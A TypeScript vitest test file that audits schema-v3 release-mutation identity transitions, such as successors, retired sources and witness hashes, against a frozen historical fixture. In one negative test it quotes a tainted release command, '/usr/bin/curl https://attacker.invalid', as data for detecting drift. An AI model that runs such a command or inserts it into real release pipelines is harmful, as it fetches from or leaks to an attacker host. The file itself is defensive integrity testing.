import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { replaceExactly } from "./helpers/exact-source-mutation.js";
import { observeReleaseMutationTransitionPopulation } from "./release-mutation-identity-audit.js";
import {
  auditReleaseMutationTransition,
  buildReleaseMutationTransitionAuthority,
  type ReleaseMutationTransitionAuthority,
  type ReleaseMutationTransitionPopulation,
  type ReleaseMutationTransitionProjection,
  releaseMutationTransitionProjectionWitness
} from "./release-mutation-transition.js";
import { releaseMutationVersionedTransitionAuditProblems } from "./release-mutation-transition-audit.js";
import {
  RELEASE_MUTATION_V3_CHANGED_SOURCES,
  RELEASE_MUTATION_V3_CURRENT_MCPB_INPUTS,
  RELEASE_MUTATION_V3_EXPECTED_IDENTITY_COUNT,
  RELEASE_MUTATION_V3_EXPECTED_LEGACY_COUNT,
  RELEASE_MUTATION_V3_EXPECTED_SOURCE_COUNT,
  RELEASE_MUTATION_V3_NEW_IDENTITIES,
  RELEASE_MUTATION_V3_NEW_SOURCES,
  RELEASE_MUTATION_V3_RETIRED_SOURCES,
  RELEASE_MUTATION_V3_SUCCESSORS,
  RELEASE_MUTATION_V3_UNCHANGED_OLD_IDS,
  RELEASE_MUTATION_V3_UNCHANGED_SOURCES
} from "./release-mutation-transition-plan.js";

const FIXTURE_SHA256 = "a".repeat(64);
const HISTORICAL_FIXTURE_SHA256 = "8205d24e6d42dd4cb8986368611514131abe701434beb30150e33ea08f4b1288";

function projection(id: string, values: Readonly<Record<string, string>>): ReleaseMutationTransitionProjection {
  return { id, ...values };
}

function populations(): {
  readonly authority: ReleaseMutationTransitionAuthority;
  readonly current: ReleaseMutationTransitionPopulation;
  readonly historical: ReleaseMutationTransitionPopulation;
} {
  const stableSource = projection("source.stable", {
    contentSha256: "1".repeat(64),
    path: "stable.txt"
  });
  const changedSourceBefore = projection("source.changed", {
    contentSha256: "2".repeat(64),
    path: "changed.txt"
  });
  const changedSourceAfter = projection("source.changed", {
    contentSha256: "3".repeat(64),
    path: "changed.txt"
  });
  const retiredSource = projection("source.retired", {
    contentSha256: "4".repeat(64),
    path: "retired.txt"
  });
  const newSource = projection("source.new", {
    contentSha256: "5".repeat(64),
    path: "new.txt"
  });
  const unchangedIdentity = projection("release.m001", {
    mode: "first",
    needle: "stable",
    witness: "stable->mutant"
  });
  const successorBefore = projection("release.m002", {
    mode: "first",
    needle: "old transaction",
    witness: "old->guarded"
  });
  const successorAfter = projection("release.m101", {
    mode: "first",
    needle: "new transaction",
    witness: "new->guarded"
  });
  const retiredIdentity = projection("release.m003", {
    mode: "all",
    needle: "obsolete transaction",
    witness: "obsolete->disabled"
  });
  const newIdentity = projection("release.m102", {
    mode: "first",
    needle: "new root",
    witness: "new-root->disabled"
  });
  const historical: ReleaseMutationTransitionPopulation = {
    schemaVersion: 2,
    fixtureSha256: FIXTURE_SHA256,
    sources: [stableSource, changedSourceBefore, retiredSource],
    identities: [unchangedIdentity, successorBefore, retiredIdentity]
  };
  const current: ReleaseMutationTransitionPopulation = {
    schemaVersion: 3,
    sources: [stableSource, changedSourceAfter, newSource],
    identities: [unchangedIdentity, successorAfter, newIdentity]
  };
  const authority: ReleaseMutationTransitionAuthority = {
    schemaVersion: 3,
    normalizer: "release-mutation-transition-v3",
    historicalFixtureSha256: FIXTURE_SHA256,
    unchangedSources: [
      {
        id: stableSource.id
      }
    ],
    sourceChanges: [
      {
        id: changedSourceBefore.id,
        allowedChanges: ["/contentSha256"],
        reason: "reviewed source bytes changed",
        witness: {
          from: releaseMutationTransitionProjectionWitness(changedSourceBefore),
          to: releaseMutationTransitionProjectionWitness(changedSourceAfter)
        }
      }
    ],
    retiredSources: [
      {
        oldId: retiredSource.id,
        reason: "obsolete source was intentionally removed",
        witness: releaseMutationTransitionProjectionWitness(retiredSource)
      }
    ],
    sourceSuccessors: [],
    newSources: [
      {
        id: newSource.id,
        reason: "new source has no historical identity",
        witness: releaseMutationTransitionProjectionWitness(newSource)
      }
    ],
    identityTransitions: [
      {
        oldId: successorBefore.id,
        newId: successorAfter.id,
        reason: "transaction control gained a reviewed successor",
        witness: {
          from: releaseMutationTransitionProjectionWitness(successorBefore),
          to: releaseMutationTransitionProjectionWitness(successorAfter)
        }
      },
      {
        oldId: retiredIdentity.id,
        reason: "obsolete transaction control was retired",
        witness: releaseMutationTransitionProjectionWitness(retiredIdentity)
      }
    ],
    unchangedIdentities: [
      {
        id: unchangedIdentity.id
      }
    ],
    newIdentities: [
      {
        id: newIdentity.id,
        reason: "new causal root has no historical identity",
        witness: releaseMutationTransitionProjectionWitness(newIdentity)
      }
    ]
  };
  return { historical, current, authority };
}

// These three checks execute the complete versioned audit rather than one unit
// helper. Hosted plain Node 22.13/24 measured 19s/13s for the frozen authority
// and 106s/82s for the causal closure. Hosted V8 coverage measured 23.795s,
// 17.754s, and 177.515s for the frozen authority, complete-source drift, and
// causal closure respectively; a later full local Node 25 V8 run measured the
// frozen authority at 35.728s. Rounded local ceilings retain at least 40%
// headroom over those maxima while ordinary tests keep the global 15s breaker
// and every source scan, mutation, assertion, and generator comparison remains.
const COMPLETE_SOURCE_DRIFT_AUDIT_TIMEOUT_MS = 30_000;
const TRANSITION_CAUSAL_CLOSURE_TIMEOUT_MS = 250_000;

describe("release mutation schema-v3 transition authority", () => {
  // biome-ignore format: Keep this exhaustive callback inline without reindenting its audited body.
  it("audits the frozen current matrix through the exact versioned authority", () => {
    const matrixSource = readFileSync(new URL("./release-integrity.test.ts", import.meta.url), "utf8");
    const historicalFixtureSource = readFileSync(
      new URL("./fixtures/release-mutation-identity.v2.json", import.meta.url),
      "utf8"
    );
    const authoritySource = readFileSync(
      new URL("./fixtures/release-mutation-transition.v3.json", import.meta.url),
      "utf8"
    );

    expect(
      releaseMutationVersionedTransitionAuditProblems(matrixSource, historicalFixtureSource, authoritySource)
    ).toEqual([]);
    expect(
      execFileSync(
        process.execPath,
        [
          fileURLToPath(new URL("../scripts/generate-release-mutation-transition.mjs", import.meta.url)),
          "--authority-current"
        ],
        { cwd: fileURLToPath(new URL("..", import.meta.url)), encoding: "utf8" }
      )
    ).toBe(authoritySource);
  }, 60_000);

  it("keeps the META positive baseline wired to v3 and legacy checks differential-only", () => {
    const metaSource = readFileSync(new URL("./meta-invariant-coverage.test.ts", import.meta.url), "utf8");

    expect(metaSource).toContain(
      'import { releaseMutationVersionedTransitionAuditProblems } from "./release-mutation-transition-audit.js";'
    );
    expect(metaSource).toContain(
      "releaseMutationVersionedTransitionAuditProblems(matrixSource, fixtureBefore, transitionAuthority)"
    );
    expect(metaSource).toContain(
      "diagnosticMultisetDifference(preparedAudit.auditMatrix(candidate), historicalBaselineProblems)"
    );
    expect(metaSource).not.toContain("expect(preparedAudit.auditMatrix(matrixSource)).toEqual([])");
  });

  it(
    "NEGATIVE rejects complete-source drift before an unchanged row can inherit historical semantics",
    () => {
      const matrixSource = readFileSync(new URL("./release-integrity.test.ts", import.meta.url), "utf8");
      const historicalFixtureSource = readFileSync(
        new URL("./fixtures/release-mutation-identity.v2.json", import.meta.url),
        "utf8"
      );
      const authoritySource = readFileSync(
        new URL("./fixtures/release-mutation-transition.v3.json", import.meta.url),
        "utf8"
      );
      const drifted = replaceExactly(
        matrixSource,
        "interface WorkflowJob {",
        "// unauthorized transition drift\ninterface WorkflowJob {"
      );
      expect(drifted).not.toBe(matrixSource);

      expect(
        releaseMutationVersionedTransitionAuditProblems(drifted, historicalFixtureSource, authoritySource)
      ).toEqual(expect.arrayContaining([expect.stringMatching(/current matrix source witness mismatch/)]));
    },
    COMPLETE_SOURCE_DRIFT_AUDIT_TIMEOUT_MS
  );

  it("keeps schema v2 byte-exact while reserving every successor and new identity", () => {
    const fixtureSource = readFileSync(
      new URL("./fixtures/release-mutation-identity.v2.json", import.meta.url),
      "utf8"
    );
    const fixture = JSON.parse(fixtureSource) as {
      readonly mutations: readonly { readonly id: string; readonly role: string }[];
      readonly schemaVersion: number;
      readonly sources: readonly { readonly id: string }[];
    };
    const historicalMutationIds = new Set(fixture.mutations.map((mutation) => mutation.id));
    const historicalSourceIds = new Set(fixture.sources.map((source) => source.id));
    const successorOldIds = RELEASE_MUTATION_V3_SUCCESSORS.map((entry) => entry.oldId);
    const currentOnlyMutationIds = [
      ...RELEASE_MUTATION_V3_NEW_IDENTITIES.map((entry) => entry.id),
      ...RELEASE_MUTATION_V3_SUCCESSORS.map((entry) => entry.newId)
    ];

    expect(fixture.schemaVersion).toBe(2);
    expect(createHash("sha256").update(fixtureSource, "utf8").digest("hex")).toBe(HISTORICAL_FIXTURE_SHA256);
    expect(fixture.mutations).toHaveLength(560);
    expect(new Set(successorOldIds).size).toBe(76);
    expect(successorOldIds.every((id) => historicalMutationIds.has(id))).toBe(true);
    expect(new Set(currentOnlyMutationIds).size).toBe(133);
    expect(currentOnlyMutationIds.some((id) => historicalMutationIds.has(id))).toBe(false);
    expect(fixture.mutations.length - successorOldIds.length).toBe(484);
    expect(RELEASE_MUTATION_V3_UNCHANGED_OLD_IDS).toHaveLength(484);
    expect(new Set([...RELEASE_MUTATION_V3_UNCHANGED_OLD_IDS, ...successorOldIds])).toEqual(historicalMutationIds);
    expect(RELEASE_MUTATION_V3_UNCHANGED_OLD_IDS).toEqual(
      expect.arrayContaining(["release.m490", "release.m491", "release.m496", "release.m497"])
    );
    expect(RELEASE_MUTATION_V3_SUCCESSORS).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ oldId: "release.m290", newId: "release.m694" }),
        expect.objectContaining({ oldId: "release.m477", newId: "release.m695" })
      ])
    );
    expect(
      RELEASE_MUTATION_V3_SUCCESSORS.some((entry) =>
        ["release.m490", "release.m491", "release.m496", "release.m497"].includes(entry.oldId)
      )
    ).toBe(false);
    expect(RELEASE_MUTATION_V3_NEW_IDENTITIES).toHaveLength(57);
    expect(RELEASE_MUTATION_V3_NEW_IDENTITIES.filter((entry) => entry.role === "root")).toHaveLength(56);
    expect(RELEASE_MUTATION_V3_NEW_IDENTITIES.filter((entry) => entry.role === "dependency")).toHaveLength(1);
    expect(
      RELEASE_MUTATION_V3_NEW_IDENTITIES.filter((entry) => {
        const numericId = Number(entry.id.slice("release.m".length));
        return numericId >= 582 && numericId <= 627;
      }).map((entry) => entry.id)
    ).toEqual(Array.from({ length: 46 }, (_, index) => `release.m${582 + index}`));
    expect(new Set(RELEASE_MUTATION_V3_NEW_IDENTITIES.map((entry) => entry.logicalProjectionSha256)).size).toBe(57);
    expect(RELEASE_MUTATION_V3_NEW_IDENTITIES.slice(20, 29).map((entry) => entry.id)).toEqual(
      Array.from({ length: 9 }, (_, index) => `release.m${685 + index}`)
    );
    expect(
      RELEASE_MUTATION_V3_NEW_IDENTITIES.every((entry) => /^[0-9a-f]{64}$/u.test(entry.logicalProjectionSha256))
    ).toBe(true);
    expect(RELEASE_MUTATION_V3_NEW_IDENTITIES.every((entry) => /^[0-9a-f]{64}$/u.test(entry.caseNodeSha256))).toBe(
      true
    );
    expect(
      RELEASE_MUTATION_V3_SUCCESSORS.every(
        (entry) =>
          /^[0-9a-f]{64}$/u.test(entry.logicalProjectionSha256) &&
          /^[0-9a-f]{64}$/u.test(entry.nodeSha256) &&
          /^[0-9a-f]{64}$/u.test(entry.caseNodeSha256)
      )
    ).toBe(true);
    expect(RELEASE_MUTATION_V3_NEW_IDENTITIES.find((entry) => entry.id === "release.m614")).toMatchObject({
      ownerId: "release.m614",
      role: "root",
      sourceId: "release.m615"
    });
    expect(RELEASE_MUTATION_V3_NEW_IDENTITIES.find((entry) => entry.id === "release.m615")).toMatchObject({
      ownerId: "release.m614",
      role: "dependency",
      sourceId: "fixture.release-workflow"
    });
    expect(
      RELEASE_MUTATION_V3_NEW_IDENTITIES.find((entry) => entry.id === "release.m627")?.valueDerivation
    ).toMatchObject({ kind: "tainted-release-transaction-sha256" });
    expect(RELEASE_MUTATION_V3_EXPECTED_LEGACY_COUNT).toBe(523);
    expect(RELEASE_MUTATION_V3_EXPECTED_IDENTITY_COUNT).toBe(617);
    expect(RELEASE_MUTATION_V3_EXPECTED_SOURCE_COUNT).toBe(33);
    expect(RELEASE_MUTATION_V3_CURRENT_MCPB_INPUTS).toHaveLength(16);
    expect(RELEASE_MUTATION_V3_CURRENT_MCPB_INPUTS.map((entry) => entry.property)).toEqual([
      "manifest",
      "cli",
      "cliHelp",
      "server",
      "build",
      "consumer",
      "docsApi",
      "entrypoint",
      "integrity",
      "npmArtifact",
      "packageLock",
      "packageJson",
      "release",
      "releaseTransaction",
      "versionCheck",
      "versionSync"
    ]);
    expect(RELEASE_MUTATION_V3_RETIRED_SOURCES.map((entry) => entry.id)).toEqual([
      "fragment.npm-pack-command",
      "fragment.github-create-channel",
      "fragment.npm-publish-command"
    ]);
    expect(historicalSourceIds.has("fragment.npm-pack-command")).toBe(true);
    expect(RELEASE_MUTATION_V3_NEW_SOURCES.map((entry) => entry.id)).toEqual([
      "fragment.github-create-channel-v4",
      "fragment.npm-publish-command-v4",
      "fragment.npm-tarball-assignment",
      "fragment.npm-manifest-assignment",
      "script.entrypoint",
      "script.npm-artifact"
    ]);
    expect(RELEASE_MUTATION_V3_NEW_SOURCES.some((entry) => historicalSourceIds.has(entry.id))).toBe(false);
    expect(RELEASE_MUTATION_V3_CHANGED_SOURCES).toHaveLength(17);
    expect(RELEASE_MUTATION_V3_UNCHANGED_SOURCES).toHaveLength(10);
    expect(
      new Set([
        ...RELEASE_MUTATION_V3_UNCHANGED_SOURCES,
        ...RELEASE_MUTATION_V3_CHANGED_SOURCES.map((entry) => entry.id),
        ...RELEASE_MUTATION_V3_RETIRED_SOURCES.map((entry) => entry.id)
      ])
    ).toEqual(historicalSourceIds);

    const npmTarballRoot = fixture.mutations.find((mutation) => mutation.id === "release.m247");
    const npmTarballDependency = fixture.mutations.find((mutation) => mutation.id === "release.m248");
    const npmManifestRoot = fixture.mutations.find((mutation) => mutation.id === "release.m249");
    const npmManifestDependency = fixture.mutations.find((mutation) => mutation.id === "release.m250");
    expect([
      npmTarballRoot?.role,
      npmTarballDependency?.role,
      npmManifestRoot?.role,
      npmManifestDependency?.role
    ]).toEqual(["root", "dependency", "root", "dependency"]);
  });

  // biome-ignore format: Keep this exhaustive callback inline without reindenting its audited body.
  it("NEGATIVE binds new split identities to resolved values, derivations, and the 16-source closure", () => {
    const matrixSource = readFileSync(new URL("./release-integrity.test.ts", import.meta.url), "utf8");
    const historicalFixtureSource = readFileSync(
      new URL("./fixtures/release-mutation-identity.v2.json", import.meta.url),
      "utf8"
    );
    const authoritySource = readFileSync(
      new URL("./fixtures/release-mutation-transition.v3.json", import.meta.url),
      "utf8"
    );
    const observeCandidate = (candidate: string) =>
      observeReleaseMutationTransitionPopulation(candidate, historicalFixtureSource, HISTORICAL_FIXTURE_SHA256, {
        currentMcpbInputs: RELEASE_MUTATION_V3_CURRENT_MCPB_INPUTS,
        expectedIdentityCount: RELEASE_MUTATION_V3_EXPECTED_IDENTITY_COUNT,
        expectedLegacyCount: RELEASE_MUTATION_V3_EXPECTED_LEGACY_COUNT,
        expectedSourceCount: RELEASE_MUTATION_V3_EXPECTED_SOURCE_COUNT,
        newIdentities: RELEASE_MUTATION_V3_NEW_IDENTITIES,
        newSources: RELEASE_MUTATION_V3_NEW_SOURCES,
        retiredSourceIds: RELEASE_MUTATION_V3_RETIRED_SOURCES.map((entry) => entry.id),
        successors: RELEASE_MUTATION_V3_SUCCESSORS,
        unchangedOldIds: RELEASE_MUTATION_V3_UNCHANGED_OLD_IDS
      });
    const observe = (candidate: string) => observeCandidate(candidate).problems;
    const auditWithCoarseWitnessesRepinned = (
      candidate: string,
      observation: ReturnType<typeof observeCandidate>
    ): readonly string[] => {
      const repinnedAuthority = JSON.parse(authoritySource) as {
        current: { matrixSliceSha256: string; matrixSourceSha256: string };
      };
      repinnedAuthority.current.matrixSourceSha256 = observation.sourceSha256;
      if (observation.matrixSliceSha256 === null) throw new Error("causal control lost the matrix slice");
      repinnedAuthority.current.matrixSliceSha256 = observation.matrixSliceSha256;
      return releaseMutationVersionedTransitionAuditProblems(
        candidate,
        historicalFixtureSource,
        JSON.stringify(repinnedAuthority)
      );
    };

    expect(observe(matrixSource)).toEqual([]);
    const referencedConstantDrift = replaceExactly(
      matrixSource,
      '                --provenance --access public --tag "$CHANNEL" --ignore-scripts\';',
      '                --provenance --access public --tag "$CHANNEL" --ignore-scripts # drift\';'
    );
    expect(referencedConstantDrift).not.toBe(matrixSource);
    expect(observe(referencedConstantDrift)).toContain(
      "current new identity release.m603 disagrees with its reviewed logical projection"
    );

    const derivationDrift = replaceExactly(
      matrixSource,
      "/usr/bin/curl https://attacker.invalid\\n`;",
      "/usr/bin/curl https://different.invalid\\n`;"
    );
    expect(derivationDrift).not.toBe(matrixSource);
    expect(observe(derivationDrift)).toContain(
      "current new identity release.m627 has an unreviewed tainted-transaction derivation"
    );

    const companionClosureDrift = replaceExactly(
      matrixSource,
      'entrypoint: readFileSync(new URL("../scripts/lib/entrypoint.mjs", import.meta.url), "utf8"),',
      "entrypoint: mcpbInputs.integrity,"
    );
    expect(companionClosureDrift).not.toBe(matrixSource);
    expect(observe(companionClosureDrift)).toContain(
      "current transition mcpbInputs must retain the exact reviewed 16-source companion closure"
    );

    const unchangedSuccessorDrift = replaceExactly(
      matrixSource,
      'replaceExactly(workflow, "  actions: read", "  actions: none", 4)',
      'replaceExactly(workflow, "  actions: read", "  actions: write", 4)'
    );
    expect(unchangedSuccessorDrift).not.toBe(matrixSource);
    expect(observe(unchangedSuccessorDrift)).toContain(
      "current successor release.m638 disagrees with its reviewed target witnesses"
    );

    const existingSuccessorDrift = replaceExactly(
      matrixSource,
      `'requireSpan(mcpbParsed, "/missing-version"'`,
      `'requireSpan(mcpbParsed, "/attacker-version"'`
    );
    expect(existingSuccessorDrift).not.toBe(matrixSource);
    expect(observe(existingSuccessorDrift)).toContain(
      "current successor release.m563 disagrees with its reviewed target witnesses"
    );

    const m151WitnessDrift = replaceExactly(
      matrixSource,
      ["        anchor: MCPB_EXACT_NPM_PUBLISH.slice(0, 512),", "        before: 1,", "        after: 2"].join("\n"),
      ["        anchor: MCPB_EXACT_NPM_PUBLISH.slice(0, 512),", "        before: 0,", "        after: 2"].join("\n")
    );
    expect(m151WitnessDrift).not.toBe(matrixSource);
    const m151Observation = observeCandidate(m151WitnessDrift);
    const m151Problems = auditWithCoarseWitnessesRepinned(m151WitnessDrift, m151Observation);
    expect(m151Problems).not.toEqual(
      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
    );
    expect(m151Problems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/current successor release\.m636 disagrees with its reviewed target witnesses/),
        expect.stringMatching(
          /current declarative identity release\.m636 witness disagrees with independently derived semantics/
        )
      ])
    );

    const splitMatcherDrift = replaceExactly(
      matrixSource,
      "      expect(mcpbContractProblems({ ...mcpbInputs, release: splitReleaseMutant })).toContain(\n",
      "      expect(mcpbContractProblems({ ...mcpbInputs, release: splitReleaseMutant })).not.toContain(\n"
    );
    expect(splitMatcherDrift).not.toBe(matrixSource);
    const splitMatcherObservation = observeCandidate(splitMatcherDrift);
    expect(splitMatcherObservation.problems).toContain(
      "current target release.m582 case witness f0589fc81ef309f34760347e7e4d020c921026eaee8b0b78c6e3c3c48f3d6f0b must identify one exact root-bound case node; found 0"
    );
    const splitMatcherProblems = auditWithCoarseWitnessesRepinned(splitMatcherDrift, splitMatcherObservation);
    expect(splitMatcherProblems).not.toEqual(
      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
    );
    expect(splitMatcherProblems).toContain(
      "current target release.m582 case witness f0589fc81ef309f34760347e7e4d020c921026eaee8b0b78c6e3c3c48f3d6f0b must identify one exact root-bound case node; found 0"
    );

    const splitInvocationDrift = replaceExactly(
      matrixSource,
      "      expect(mcpbContractProblems({ ...mcpbInputs, release: splitReleaseMutant })).toContain(\n",
      "      expect(mcpbContractProblems({ ...mcpbInputs, release: mcpbInputs.release })).toContain(\n"
    );
    expect(splitInvocationDrift).not.toBe(matrixSource);
    const splitInvocationObservation = observeCandidate(splitInvocationDrift);
    expect(splitInvocationObservation.problems).toContain(
      "current target release.m582 case witness f0589fc81ef309f34760347e7e4d020c921026eaee8b0b78c6e3c3c48f3d6f0b must identify one exact root-bound case node; found 0"
    );
    const splitInvocationProblems = auditWithCoarseWitnessesRepinned(splitInvocationDrift, splitInvocationObservation);
    expect(splitInvocationProblems).not.toEqual(
      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
    );
    expect(splitInvocationProblems).toContain(
      "current target release.m582 case witness f0589fc81ef309f34760347e7e4d020c921026eaee8b0b78c6e3c3c48f3d6f0b must identify one exact root-bound case node; found 0"
    );

    const equivalentOriginDrift = replaceExactly(
      matrixSource,
      'const MCPB_RELEASE_VISIBILITY_POLL =\n  "          for (( release_attempt=1; release_attempt<=12; release_attempt++ )); do";',
      'const MCPB_RELEASE_VISIBILITY_POLL =\n  ("          for (( release_attempt=1; release_attempt<=12; release_attempt++ )); do");'
    );
    expect(equivalentOriginDrift).not.toBe(matrixSource);
    const originObservation = observeCandidate(equivalentOriginDrift);
    const repinnedAuthority = JSON.parse(authoritySource) as {
      current: { matrixSliceSha256: string; matrixSourceSha256: string };
    };
    repinnedAuthority.current.matrixSourceSha256 = originObservation.sourceSha256;
    if (originObservation.matrixSliceSha256 === null) throw new Error("origin control lost the matrix slice");
    repinnedAuthority.current.matrixSliceSha256 = originObservation.matrixSliceSha256;
    expect(
      releaseMutationVersionedTransitionAuditProblems(
        equivalentOriginDrift,
        historicalFixtureSource,
        JSON.stringify(repinnedAuthority)
      )
    ).toContain("source historical ID fragment.release-visibility-poll was reused for a changed projection");
  }, TRANSITION_CAUSAL_CLOSURE_TIMEOUT_MS);

  it("classifies every historical and current identity without repinning schema v2", () => {
    const { historical, current, authority } = populations();
    const historicalBefore = structuredClone(historical);
    const currentBefore = structuredClone(current);
    const result = auditReleaseMutationTransition(historical, current, authority);

    expect(result.problems).toEqual([]);
    expect(result.identities).toEqual({
      changed: [],
      unchanged: ["release.m001"],
      retired: ["release.m003"],
      successor: ["release.m002"],
      new: ["release.m102"]
    });
    expect(result.sources).toEqual({
      changed: ["source.changed"],
      unchanged: ["source.stable"],
      retired: ["source.retired"],
      successor: [],
      new: ["source.new"]
    });
    expect(historical).toEqual(historicalBefore);
    expect(current).toEqual(currentBefore);

    const built = buildReleaseMutationTransitionAuthority(historical, current, {
      historicalFixtureSha256: FIXTURE_SHA256,
      unchangedSourceIds: ["source.stable"],
      changedSources: [
        {
          id: "source.changed",
          allowedChanges: ["/contentSha256"],
          reason: "reviewed source bytes changed"
        }
      ],
      retiredSources: [
        {
          id: "source.retired",
          reason: "obsolete source was intentionally removed"
        }
      ],
      sourceSuccessors: [],
      newSourceIds: [
        {
          id: "source.new",
          reason: "new source has no historical identity"
        }
      ],
      unchangedIdentityIds: ["release.m001"],
      identitySuccessors: [
        {
          oldId: "release.m002",
          newId: "release.m101",
          reason: "transaction control gained a reviewed successor"
        }
      ],
      retiredIdentities: [
        {
          id: "release.m003",
          reason: "obsolete transaction control was retired"
        }
      ],
      newIdentityIds: [
        {
          id: "release.m102",
          reason: "new causal root has no historical identity"
        }
      ]
    });
    expect(built.problems).toEqual([]);
    expect(built.authority).toEqual(authority);
  });

  it("NEGATIVE rejects unauthorized source drift outside the exact deep-diff allowlist", () => {
    const { historical, current, authority } = populations();
    const drifted: ReleaseMutationTransitionPopulation = {
      ...current,
      sources: current.sources.map((source) =>
        source.id === "source.changed" ? { ...source, path: "unreviewed.txt" } : source
      )
    };

    expect(auditReleaseMutationTransition(historical, drifted, authority).problems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/source change source\.changed deep diff must equal its exact allowlist/),
        expect.stringMatching(
          /^source change source\.changed current witness mismatch; recorded sha256:[0-9a-f]{64}, observed sha256:[0-9a-f]{64}$/
        )
      ])
    );
  });

  it("NEGATIVE rejects reuse of a historical ID for changed semantics", () => {
    const { historical, current, authority } = populations();
    const reused: ReleaseMutationTransitionPopulation = {
      ...current,
      identities: current.identities.map((identity) =>
        identity.id === "release.m101" ? { ...identity, id: "release.m002" } : identity
      )
    };

    expect(auditReleaseMutationTransition(historical, reused, authority).problems).toEqual(
      expect.arrayContaining([
        "executable identity historical ID release.m002 was reused for a changed projection",
        "executable identity successor release.m002 target release.m101 is missing"
      ])
    );
  });

  it("NEGATIVE rejects missing successor and declared-new targets", () => {
    const { historical, current, authority } = populations();
    const missing: ReleaseMutationTransitionPopulation = {
      ...current,
      identities: current.identities.filter(
        (identity) => identity.id !== "release.m101" && identity.id !== "release.m102"
      )
    };

    expect(auditReleaseMutationTransition(historical, missing, authority).problems).toEqual(
      expect.arrayContaining([
        "executable identity successor release.m002 target release.m101 is missing",
        "executable identity declared new target release.m102 is missing"
      ])
    );
  });

  it("NEGATIVE rejects a successor whose target witness was copied from another identity", () => {
    const { historical, current, authority } = populations();
    const alternate = current.identities.find((identity) => identity.id === "release.m102");
    if (alternate === undefined) throw new Error("missing alternate witness control");
    const mismatched: ReleaseMutationTransitionAuthority = {
      ...authority,
      identityTransitions: authority.identityTransitions.map((entry) =>
        "newId" in entry
          ? {
              ...entry,
              witness: {
                ...entry.witness,
                to: releaseMutationTransitionProjectionWitness(alternate)
              }
            }
          : entry
      )
    };

    expect(auditReleaseMutationTransition(historical, current, mismatched).problems).toContain(
      "executable identity successor release.m002 target witness mismatch"
    );
  });
});
